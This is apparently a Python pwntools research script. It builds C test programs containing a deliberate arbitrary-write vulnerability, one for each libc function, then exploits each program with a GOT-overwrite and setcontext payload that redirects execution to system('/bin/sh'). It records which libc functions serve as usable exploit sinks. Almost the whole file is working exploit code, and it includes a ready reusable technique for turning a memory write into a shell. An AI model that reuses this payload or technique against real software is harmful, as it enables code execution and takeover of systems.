import subprocess
from pwn import *
import sys
def execute_ret(cmd,stdin=None,stdout=None,stderr=None):
    try:
        res = subprocess.run(cmd,timeout=3,stdin=stdin,stdout=stdout,stderr=stderr)
    except:
        return -1
    return res.returncode
def create_ucontext(
    src: int,rsp=0,rbx=0,
    rbp=0,r12=0,r13=0,r14=0,r15=0,
    rsi=0,rdi=0,rcx=0,r8=0,r9=0,
    rdx=0,rip=0xDEADBEEF,) -> bytearray:
    b = bytearray(0x200)
    b[0xE0:0xE8] = p64(src)  # fldenv ptr
    b[0x1C0:0x1C8] = p64(0x1F80)  # ldmxcsr

    b[0xA0:0xA8] = p64(rsp)
    b[0x80:0x88] = p64(rbx)
    b[0x78:0x80] = p64(rbp)
    b[0x48:0x50] = p64(r12)
    b[0x50:0x58] = p64(r13)
    b[0x58:0x60] = p64(r14)
    b[0x60:0x68] = p64(r15)

    b[0xA8:0xB0] = p64(rip)  # ret ptr
    b[0x70:0x78] = p64(rsi)
    b[0x68:0x70] = p64(rdi)
    b[0x98:0xA0] = p64(rcx)
    b[0x28:0x30] = p64(r8)
    b[0x30:0x38] = p64(r9)
    b[0x88:0x90] = p64(rdx)

    return b
def setcontext32(libc: ELF, **kwargs) -> (int, bytes):
    # Payload Len = 
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt_trampoline = libc.address + libc.get_section_by_name(".plt").header.sh_addr
    return got, flat(
        p64(0),
        p64(got + 0x218),
        p64(libc.symbols["setcontext"] + 32),
        p64(plt_trampoline) * 0x40,
        create_ucontext(got + 0x218, rsp=libc.symbols["environ"] + 8, **kwargs),
    )
def prob():
    p       = process("./sinkProb")
    # gdb.attach(p,'''b puts''')
    base = int(p.readline(),16) - (0x7ff6a25244a0-0x7ff6a24c8000) - 0x4250
    info(hex(base))
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    libc.address=base
    dest, payload = setcontext32(
        libc, rip=libc.sym["system"], rdi=libc.search(b"/bin/sh").__next__()
    )
    plt0 = libc.address + libc.get_section_by_name(".plt").header.sh_addr
    context.arch='amd64'
    info(hex(plt0))
    p.send(p64(dest))
    p.send(p64(len(payload)))
    p.send(payload)
    try:
        p.sendline(b"echo 1")
        # print(p.read())
        if p.read() != b"1\n":
            p.close()
            assert(1==2)
        p.close()
    except:
        p.close()
        assert(1==2)

def funcFilter(funcs):
    f = []
    for x in funcs:
        if "." in x:
            continue
        if "@@" in x and not x.startswith("_"):
            f.append(x.split("@@")[0])
        elif "@" in x and not x.startswith("_"):
            f.append(x.split("@")[0])
        elif x.startswith("got.") or x.startswith("plt.") or x.startswith("_"):
            pass
        else:
            f.append(x)
    f = list(set(f))
    return f
def sinkFinder():
    res = []
    fff = funcFilter(list(ELF("/lib/x86_64-linux-gnu/libc.so.6").sym.keys()))
    failed = 0
    failed_func = []
    passed = 0
    passed_func = []
    for func in fff:
        source = f"""//n132
    #define _GNU_SOURCE 
    #include <assert.h>
    #include <math.h>
    #include <stdlib.h>
    #include <complex.h>
    #include <setjmp.h>
    #include <stdnoreturn.h>
    #include <ctype.h>
    #include <signal.h>
    #include <string.h>

    #include <errno.h>
    #include <stdalign.h>
    #include <tgmath.h>
    #include <fenv.h>
    #include <stdarg.h>
    #include <threads.h>
    #include <float.h>
    #include <stdatomic.h>
    #include <time.h>
    #include <inttypes.h>
    #include <stdbool.h>
    #include <uchar.h>
    #include <iso646.h>
    #include <stddef.h>
    #include <wchar.h>
    #include <limits.h>
    #include <stdint.h>
    #include <wctype.h>
    #include <locale.h>
    #include <pthread.h>
    #include <aio.h>

    #include <sys/xattr.h>
    #include <grp.h>
    #include <sys/prctl.h>
    #include <unistd.h>
    #include <arpa/inet.h>
    #include <search.h>
    #include <sys/epoll.h>
    #include <linux/fs.h>
    #include <sys/shm.h>
    #include <fcntl.h>
    #include <semaphore.h>
    #include <nl_types.h>
    #include <linux/module.h>
    #include <sys/uio.h>
    #include <dirent.h>
    #include <wchar.h>
    #include <argp.h>
    #include <shadow.h>
    #include <netdb.h>
    #include <net/ethernet.h>
    #include <arpa/inet.h>
    #include <locale.h>
    #include <mqueue.h>
    #include <regex.h>
    #include <sys/time.h>
    #include <link.h>
    int main(){{
        size_t rw_area = malloc(0x10000);
        rw_area += 0x8000;
        size_t addr = 0;
        size_t len = 0;
        printf("%p\\n",printf);
        read(0,&addr,8);
        read(0,&len,8);
        read(0,addr,len);
        void (*p)(void *,void *,void *,void *,void *,void *) = {func};
        p(rw_area,rw_area,rw_area,rw_area,rw_area,rw_area);
    }}
    """
        with open("./sinkProb.c",'w') as f:
            f.write(source)
        if execute_ret(["gcc","./sinkProb.c","-o","sinkProb",'-w','-lpthread'],stdout=open("/dev/null",'w'),stderr=open("/dev/null",'w'))==0:
            passed+=1
            passed_func.append(func)
        else:
            failed+=1
            failed_func.append(func)
            continue

        ret_code = execute_ret(["python3","./SinkFinder.py"],stdout=open("/dev/null",'w'),stderr=open("/dev/null",'w'))
        # print(ret_code,func)
        if ret_code==0:
            res.append(func)
            print(fff.index(func),res)
        else:
            continue
    print(len(res))
    return res
if __name__ == "__main__":
    if len(sys.argv) == 2:
        print("[+] Finder")
        sinkFinder()
    else:
        print("[+] Prob")
        prob()

    